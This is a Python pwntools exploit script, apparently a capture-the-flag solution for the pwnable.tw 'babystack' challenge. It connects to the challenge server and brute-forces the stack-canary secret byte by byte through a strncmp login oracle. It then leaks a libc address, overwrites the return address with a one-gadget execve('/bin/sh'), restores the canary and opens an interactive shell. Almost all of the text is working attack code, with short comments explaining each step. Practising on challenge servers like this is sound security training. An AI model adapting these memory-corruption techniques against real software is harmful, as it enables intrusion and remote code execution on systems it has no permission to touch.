#!/usr/bin/env python3

from pwn import *

exe = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10205)

    return r


def set_password(psw: bytes = None):
    r.sendlineafter(b">> ", b"1")

    if psw is not None:
        r.sendafter(b":", psw)


def exit_prog():
    r.sendlineafter(b">> ", b"2")


def cpy_buffer(data: bytes):
    r.sendlineafter(b">> ", b"3")
    r.sendafter(b":", data)


def bruteforce(pad_string: bytes = b"") -> bytes:
    val = b""

    p = log.progress("Bruteforcing")

    for idx in range(8):
        for byte in range(1, 256):
            payload = pad_string + val + byte.to_bytes(1, "little") + b"\n"
            p.status(f"0x{(val + byte.to_bytes(1, "little"))[::-1].hex()}")
            set_password(payload)

            if b"Login Success !" in r.recvline():
                val += byte.to_bytes(1, "little")
                set_password()          # Logout
                break

    p.success(f"0x{val[::-1].hex()}")
    return pad_string + val


def main():
    r = conn()

    # NOTE: Trying to insert the password again will log us out first, then we need to reinsert the option
    #       Moreover, the program uses `strncmp()` but the length is the input string, not the secret's one!
    #       So we can bypass the login or use it as oracle to bruteforce stuff byte-by-byte

    # First we retrieve the secret generated at the start (it is used as the stack canary)
    secret_psw = bruteforce()
    secret_psw += bruteforce(secret_psw)
    assert(len(secret_psw) == 0x10)
    log.info(f"secret is 0x{secret_psw[::-1].hex()}")

    '''     >>> Not necessary but we can leak binary base as well <<<
        set_password((b"\x00" * 63) + b"A")
        cpy_buffer(b"A" * 63)

        set_password()          # Logout
        exe.address = u64(bruteforce().ljust(8, b"\x00")) - 0xb70
        log.info(f"bin @ 0x{exe.address:x}")
    '''

    # With this we also set the password (specifically the second qword) to __GI__IO_file_setbuf+9
    set_password((b"\x00" * 0x3f) + (b"A" * 0x9))

    # The 64th byte is an 'A' thus the string won't be terminated by a NULL byte
    cpy_buffer(b"A" * 0x3f)

    # Now we can bruteforce that address using the login messages as indication of a (mis)match
    set_password()          # Logout
    libc.address = u64(bruteforce(b"A" * 8).ljust(8, b"\x00")) - (libc.sym.__GI__IO_file_setbuf + 9)
    assert(libc.address & 0xfff == 0)
    log.info(f"libc @ 0x{libc.address:x}")

    '''     >>> One Gadgets in libc <<<
        0x45216 execve("/bin/sh", rsp+0x30, environ)
        constraints:
          rax == NULL

        0x4526a execve("/bin/sh", rsp+0x30, environ)
        constraints:
          [rsp+0x30] == NULL

        0xef6c4 execve("/bin/sh", rsp+0x50, environ)
        constraints:
          [rsp+0x50] == NULL

        0xf0567 execve("/bin/sh", rsp+0x70, environ)
        constraints:
          [rsp+0x70] == NULL
    '''

    # With the same strategy we're going to overwrite the return address with a one gadget
    one_gadget = libc.address + 0x45216
    payload = flat(
                    b"\x00" * 0x3f,
                    b"A" * 0x29,
                    one_gadget
                )

    set_password(payload)
    cpy_buffer(b"A" * 0x3f)

    # And, as last step, we're going to fix the secret password since it is used as stack canary
    payload = flat(
                    b"\x00" * 0x3f,
                    b"A",
                    secret_psw,
                    b"\x00" * 8
                )

    set_password()      # Logout
    set_password(payload)
    cpy_buffer(b"A" * 0x3f)

    # Trigger one_gadget
    exit_prog()
    r.interactive("$ ")


if __name__ == "__main__":
    main()
